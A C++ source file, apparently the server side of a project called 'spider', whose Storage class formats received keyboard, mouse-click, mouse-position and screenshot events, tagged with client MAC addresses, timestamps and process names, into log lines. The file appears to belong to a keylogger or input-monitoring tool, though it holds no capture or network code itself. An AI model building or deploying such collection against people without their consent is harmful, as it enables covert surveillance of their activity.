#include "EventStorage.h"
#include "Logger.hpp"
#include "Keys.h"
#include <cstring>
#include <map>
#include <chrono>

namespace spider
{
  namespace server
  {
    EventStorage::EventStorage() : header(), ev()
    {
    }

    EventStorage::~EventStorage()
    {
    }

    EventStorage::EventStorage(EventStorage const &other) noexcept
        : header(other.header), ev(other.ev)
    {
    }

    EventStorage &EventStorage::operator=(EventStorage const &other) noexcept
    {
      if (this != &other)
	{
	  header = other.header;
	  ev = other.ev;
	}
      return (*this);
    }

    Storage::Storage() : m_storage{}
    {
    }

    Storage::~Storage()
    {
    }

    void Storage::push(EventStorage const &ev)
    {
      m_storage.push(ev);
    }

    void Storage::write()
    {
      static std::map<network::tcp::PacketEventState, std::string> const
          stateMap = {{network::tcp::PacketEventState::Down, "Down"},
                      {network::tcp::PacketEventState::Up, "Up"}};
      static std::map<network::tcp::PacketType, std::string> const typeMap = {
          {network::tcp::PacketType::KeyboardEvent, "Keyboard"},
          {network::tcp::PacketType::MouseButton, "MouseClick"},
          {network::tcp::PacketType::MousePosition, "MousePosition"},
          {network::tcp::PacketType::Screenshot, "Screenshot"},
          {network::tcp::PacketType::Infos, "Infos"}};
      static std::map<client::library::MouseButton, std::string> const
          mouseButtonMap = {
              {client::library::MouseButton::None, "None"},
              {client::library::MouseButton::ButtonLeft, "ButtonLeft"},
              {client::library::MouseButton::ButtonRight, "ButtonRight"}};

      while (!m_storage.empty())
	{
	  EventStorage const &store = m_storage.front();

	  std::string msg(
	      reinterpret_cast<char const *>(store.header.macAddress.data()));
	  msg += " - " +
	         timeToString(static_cast<std::time_t>(store.header.time)) +
	         " - " + typeMap.at(store.header.type) + " - ";

	  switch (store.header.type)
	    {
	    case network::tcp::PacketType::KeyboardEvent:
	      break;
	    case network::tcp::PacketType::MouseButton:
	      msg +=
	          mouseButtonMap.at(static_cast<client::library::MouseButton>(
	              store.ev.key)) +
	          " - " + stateMap.at(store.ev.state) + " [" +
	          reinterpret_cast<char const *>(store.ev.processName.data()) +
	          "]";
	      break;
	    case network::tcp::PacketType::MousePosition:
	      msg += std::to_string(store.mov.posX) + " - " +
	             std::to_string(store.mov.posY) + " [" +
	             reinterpret_cast<char const *>(
	                 store.mov.processName.data()) +
	             "]";
	      break;
	    case network::tcp::PacketType::Screenshot:
	      break;
	    case network::tcp::PacketType::Infos:
	      break;
	    }

	  nope::log::Log(Info) << msg;
	  m_storage.pop();
	}
    }

    std::string Storage::timeToString(std::time_t const rawtime) const
    {
      struct tm *dt;
      std::array<char, 30> buffer{};

      dt = std::localtime(&rawtime);
      std::strftime(buffer.data(), sizeof(buffer), "%c", dt);
      return std::string(buffer.data());
    }
  }
}
